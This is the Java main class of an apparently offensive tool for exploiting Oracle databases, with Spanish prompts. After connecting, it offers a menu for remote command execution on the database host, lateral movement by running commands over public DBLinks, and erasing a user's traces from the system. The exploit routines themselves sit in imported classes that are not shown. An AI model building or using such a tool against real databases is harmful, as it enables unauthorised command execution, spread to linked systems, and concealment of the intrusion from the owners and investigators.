import conexion.*;
import explotacion.*;
import parametros.*;
import utilerias.*;

public class PrincipalExplotaOracle {

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		pantalla panta=new pantalla();
		
		parametrosConsola params=new parametrosConsola();		
		Conexion con=new Conexion();
		do 
		{
			panta.limpiaPantalla();
			if(params.getParametrosConsola()==false)
			{
				System.out.println("Salir e Intentar nuevamente"); 
				return;
			}
			con.estableceConexionBD(params);
		}while(con.getCon()==null);
		/*
		 * Aca va lo pepa del codigo
		 */
		Menu menu=new Menu();
		String opcion;
		do
		{				
			panta.limpiaPantalla();
			menu.presentaMenuPrincipal();
			opcion=menu.solicitaOpcion("Seleccione Opcion: ");
			switch(opcion) {			    
			  case "1":								  
				String comando=opcion=menu.solicitaOpcion("Ingrese Comando a Ejecutar: ");
				EjecucionRemota rce=new EjecucionRemota();
				if(rce.ejecutarComando(con, comando))				
					System.out.println("RCE Ejecucion Exitosa de: "+comando);				
				else
					System.out.println("RCE Ejecucion Fallida de: "+comando);	
				params.pausaConsola("Fin Opcion 2\nPulse enter para continuar");
				break;  
			  case "2":
				MovimientoLateral lateral=new MovimientoLateral();
				if(lateral.presentarDBLinks(con))
				{
					String dblink=opcion=menu.solicitaOpcion("\nEscoja un DBLink para Movimiento Lateral: ");
					String comandoLateral=menu.solicitaOpcion("Ingrese Comando a Ejecutar: ");
					if(lateral.ejecutarMovimiento(con, dblink, comandoLateral))				
						System.out.println("Ejecucion Exitosa de: \""+comandoLateral+ "\"sobre el DBLINK:"+dblink);				
					else
						System.out.println("Ejecucion Fallida de: \""+comandoLateral+ "\"sobre el DBLINK:"+dblink);	
				}
				else
					System.out.println("No hay DBLinks Publicos q Usar");				  
				params.pausaConsola("Fin Opcion 3\nPulse enter para continuar");
				break;  
			  case "3":
				BorradoHuellas borra=new BorradoHuellas();
				String usuario=params.getUsuario();
				if(borra.borraHuellas(con,usuario))				
					System.out.println("\nHuellas Borradas con exito de : "+usuario+"\n");				
				else
					System.out.println("\nHuellas No Borradas con exito de : "+usuario+"\n");
				params.pausaConsola("Fin Opcion 4\nPulse enter para continuar");
			    break;			  
			}					
		}while(opcion.compareTo("4")!=0);
		con.cierraConexionBD();
		panta.limpiaPantalla();				
		params.pausaConsola("Fin del Programa\nPulse enter para continuar");
	}

}
